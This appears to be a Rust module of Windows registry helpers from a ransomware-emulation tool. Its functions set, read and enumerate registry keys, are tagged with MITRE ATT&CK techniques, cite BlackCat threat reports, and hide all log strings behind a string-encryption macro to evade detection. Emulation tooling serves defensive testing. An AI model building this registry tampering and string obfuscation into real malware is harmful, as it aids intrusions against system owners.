#![cfg(target_os = "windows")]

use winapi::um::winreg::{
    RegCreateKeyExW, RegOpenKeyExW, RegSetValueExW, RegCloseKey, RegEnumKeyExW, RegGetValueW,
    HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER, 
    HKEY_USERS, HKEY_CURRENT_CONFIG, HKEY_CLASSES_ROOT,
    RRF_RT_REG_EXPAND_SZ, RRF_RT_REG_SZ
};
use winapi::um::winnt::{REG_DWORD, REG_SZ, REG_CREATED_NEW_KEY, REG_OPENED_EXISTING_KEY, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, PVOID};
use winapi::shared::minwindef::{BYTE, DWORD, HKEY};
use winapi::shared::winerror::{ERROR_SUCCESS, ERROR_INVALID_HANDLE, ERROR_MORE_DATA, ERROR_NO_MORE_ITEMS};
use crate::logger::{log_debug, log_error};
use crate::winapi_helper::*;
use encryptliterals::esl;

fn get_base_hkey_name(base_hkey: HKEY) -> Result<String, u32> {
    if base_hkey == HKEY_LOCAL_MACHINE {
        Ok(esl!("HKEY_LOCAL_MACHINE"))
    } else if base_hkey == HKEY_CURRENT_USER {
        Ok(esl!("HKEY_CURRENT_USER"))
    } else if base_hkey == HKEY_CURRENT_CONFIG {
        Ok(esl!("HKEY_CURRENT_CONFIG"))
    } else if base_hkey == HKEY_USERS {
        Ok(esl!("HKEY_USERS"))
    } else if base_hkey == HKEY_CLASSES_ROOT {
        Ok(esl!("HKEY_CLASSES_ROOT"))
    } else {
        log_error(String::from(esl!("Unsupported base HKEY")));
        Err(ERROR_INVALID_HANDLE)
    }
}

/// Set specified data to the reg value value_name at reg key path. If create_key is set to true, will create the key if needed.
fn set_reg_key_value(base_hkey: HKEY, path: &str, value_name: &str, data_type: DWORD, data: *const BYTE, data_size: u32, create_key: bool) -> Result<(), u32> {
    let base_hkey_name = get_base_hkey_name(base_hkey)?;
    let path_wstr = to_wstring(path);
    let value_wstr = to_wstring(value_name);
    let mut hkey: HKEY = std::ptr::null_mut();
    let mut disp: DWORD = 0;
    unsafe {
        if create_key {
            let create_result = RegCreateKeyExW(
                base_hkey,
                path_wstr.as_ptr(), // lpSubKey
                0, // reserved
                std::ptr::null_mut(), // lpClass
                REG_OPTION_NON_VOLATILE, // dwOptions
                KEY_ALL_ACCESS, // samDesired
                std::ptr::null_mut(), // lpSecurityAttributes
                &mut hkey, // phkResult
                &mut disp // lpdwDisposition
            );
            if create_result != ERROR_SUCCESS as i32 {
                let err_code = get_last_error();
                log_error(format!("{} {}\\{}: {}", esl!("Failed to open/create key"), base_hkey_name, path, err_code));
                return Err(err_code);
            }
            if disp == REG_CREATED_NEW_KEY {
                log_debug(format!("{} {}\\{}", esl!("Created new key"), base_hkey_name, path));
            } else if disp == REG_OPENED_EXISTING_KEY {
                log_debug(format!("{} {}\\{}", esl!("Opened existing key"), base_hkey_name, path));
            }
        } else {
            let open_result = RegOpenKeyExW(
                base_hkey,
                path_wstr.as_ptr(), // lpSubKey,
                0, // ulOptions
                KEY_ALL_ACCESS, // samDesired
                &mut hkey // phkResult
            );
            if open_result != ERROR_SUCCESS as i32 {
                let err_code = get_last_error();
                log_error(format!("{} {}\\{}: {}", esl!("Failed to open key"), base_hkey_name, path, err_code));
                return Err(err_code);
            } else {
                log_debug(format!("{} {}\\{}", esl!("Opened key"), base_hkey_name, path));
            }
        }
        let set_result = RegSetValueExW(
            hkey, 
            value_wstr.as_ptr(), 
            0, 
            data_type,
            data,
            data_size
        );
        if set_result != ERROR_SUCCESS as i32 {
            let err_code = get_last_error();
            log_error(format!("{} {} value: {}", esl!("Failed to set"), value_name, err_code));
            RegCloseKey(hkey);
            return Err(err_code);
        }
        let close_result = RegCloseKey(hkey);
        if close_result != ERROR_SUCCESS as i32 {
            let err_code = get_last_error();
            log_error(format!("{} {}\\{}: {}", esl!("Failed to close key"), base_hkey_name, path, err_code));
            return Err(err_code);
        }
    }

    Ok(())
}

/**
 * set_reg_key_dword_value
 *      About:
 *          Set specified DWORD data to the reg value value_name at reg key path. Will create the registry key if create_key is true.
 *      Result:
 *          Update specified registry key value, or return an Error should registry key value update fail
 *      MITRE ATT&CK Techniques:
 *          T1112: Modify Registry
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/ 
 */
pub fn set_reg_key_dword_value(base_hkey: HKEY, path: &str, value_name: &str, data: u32, create_key: bool) -> Result<(), u32> {
    set_reg_key_value(
        base_hkey, 
        path, 
        value_name, 
        REG_DWORD, 
        data.to_le_bytes().as_ptr(), // REG_DWORD uses little endian
        std::mem::size_of::<u32>() as u32,
        create_key
    )
}

/**
 * set_reg_key_string_value
 *      About:
 *          Set specified string data to the reg value value_name at reg key path. Will create the registry key if create_key is true.
 *      Result:
 *          Update specified registry key value, or return an Error should registry key value update fail
 *      MITRE ATT&CK Techniques:
 *          T1112: Modify Registry
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/ 
 */
 pub fn set_reg_key_string_value(base_hkey: HKEY, path: &str, value_name: &str, data: &str, create_key: bool) -> Result<(), u32> {
    let data_wstr = to_wstring(data);
    set_reg_key_value(
        base_hkey, 
        path, 
        value_name, 
        REG_SZ, 
        data_wstr.as_ptr() as *const u8,
        (data_wstr.len() * 2) as u32, // WCHAR is 16 bytes
        create_key
    )
}

/**
 * get_reg_key_string_value
 *      About:
 *          Get specified registry string value from the specified registry key.
 *      Result:
 *          Registry string value, or error if registry lookup failed.
 *      MITRE ATT&CK Techniques:
 *          T1012: Query Registry
 */
 pub fn get_reg_key_string_value(base_hkey: HKEY, path: &str, value_name: &str) -> Result<String, u32> {
    let mut data_type: DWORD = 0;
    let base_hkey_name = get_base_hkey_name(base_hkey)?;
    let path_wstr = to_wstring(path);
    let value_name_wstr = to_wstring(value_name);
    let mut failed: bool = false;
    let mut err_code: DWORD = 0;
    let mut data = String::from("");

    let buffer: [u16; 512] = [0; 512];
    let mut buf_size: DWORD = 512;
    unsafe {
        let get_result = RegGetValueW(
            base_hkey, 
            path_wstr.as_ptr(), // lpSubKey: LPCWSTR, 
            value_name_wstr.as_ptr(), // lpValue: LPCWSTR, 
            RRF_RT_REG_EXPAND_SZ | RRF_RT_REG_SZ, // dwFlags: DWORD, 
            &mut data_type, // pdwType: LPDWORD, 
            buffer.as_ptr() as PVOID, // pvData: PVOID, 
            &mut buf_size // pcbData: LPDWORD
        );
        if get_result != ERROR_SUCCESS as i32 {
            err_code = get_last_error();
            log_error(format!("{} {}\\{}: result {}", esl!("Failed to get value for"), base_hkey_name, path, get_result));
            failed = true;
        } else {
            data = from_wstring(&buffer);
            log_debug(format!("{} {}\\{}: {}", esl!("Got value for"), base_hkey_name, path, data));
        }
    }
    
    if failed {
        return Err(err_code);
    } else {
        Ok(data.clone())
    }
}

/**
 * enumerate_reg_keys
 *      About:
 *          Returns a String vector of all the registry subkey names for the specified base registry key and path.
 *      Result:
 *          String vector of all the registry subkey names for the specified reg path, or Error should registry enumeration fail
 *      MITRE ATT&CK Techniques:
 *          T1012: Query Registry
 */
pub fn enumerate_reg_keys(base_hkey: HKEY, path: &str) -> Result<Vec<String>, u32> {
    let base_hkey_name = get_base_hkey_name(base_hkey)?;
    let path_wstr = to_wstring(path);
    let mut hkey: HKEY = std::ptr::null_mut();
    let mut subkeys = Vec::new();
    let mut failed: bool = false;
    let mut err_code: DWORD = 0;
    unsafe {
        if path.len() == 0 {
            // Enumerate base key
            hkey = base_hkey;
            log_debug(format!("{} {}", esl!("Enumerating subkeys for"), base_hkey_name));
        } else {
            log_debug(format!("{} {}\\{}", esl!("Enumerating subkeys for"), base_hkey_name, path));
            let open_result = RegOpenKeyExW(
                base_hkey,
                path_wstr.as_ptr(), // lpSubKey,
                0, // ulOptions
                KEY_ALL_ACCESS, // samDesired
                &mut hkey // phkResult
            );
            if open_result != ERROR_SUCCESS as i32 {
                err_code = get_last_error();
                log_error(format!("{} {}\\{}: {}", esl!("Failed to open key"), base_hkey_name, path, err_code));
                return Err(err_code);
            } else {
                log_debug(format!("{} {}\\{}", esl!("Opened key"), base_hkey_name, path));
            }
        }

        let mut counter: u32 = 0;
        loop {
            let mut buffer: [u16; 512] = [0; 512];
            let mut buf_size: DWORD = 512;
            let enum_result = RegEnumKeyExW(
                hkey, 
                counter, // dwIndex: DWORD
                &mut buffer[0], // lpName: LPWSTR
                &mut buf_size, // lpcName: LPDWORD, 
                std::ptr::null_mut(), // lpReserved: LPDWORD, 
                std::ptr::null_mut(), // lpClass: LPWSTR, 
                std::ptr::null_mut(), // lpcClass: LPDWORD, 
                std::ptr::null_mut() // lpftLastWriteTime: PFILETIME
            );
            counter += 1;
            
            if enum_result == ERROR_SUCCESS as i32 {
                let subkey_name: String = from_wstring(&buffer);
                subkeys.push(subkey_name.clone());
                log_debug(format!("{} {}", esl!("Found subkey"), subkey_name));
            } else if enum_result == ERROR_MORE_DATA as i32 {
                log_error(String::from(esl!("Subkey name too long - skipping.")));
            } else if enum_result == ERROR_NO_MORE_ITEMS as i32 {
                log_debug(String::from(esl!("Finished enumerating subkeys.")));
                break;
            } else {
                err_code = get_last_error();
                log_error(format!("{} {}\\{}: {}", esl!("Failed to enumerate key"), base_hkey_name, path, err_code));
                failed = true;
                break;
            }
        }

        // Close handle if not one of the predefined base handles
        if path.len() > 0 {
            let close_result = RegCloseKey(hkey);
            if close_result != ERROR_SUCCESS as i32 {
                err_code = get_last_error();
                log_error(format!("{} {}\\{}: {}", esl!("Failed to close key"), base_hkey_name, path, err_code));
                return Err(err_code);
            }
        }
        if failed {
            return Err(err_code);
        } else {
            Ok(subkeys)
        }
    }
}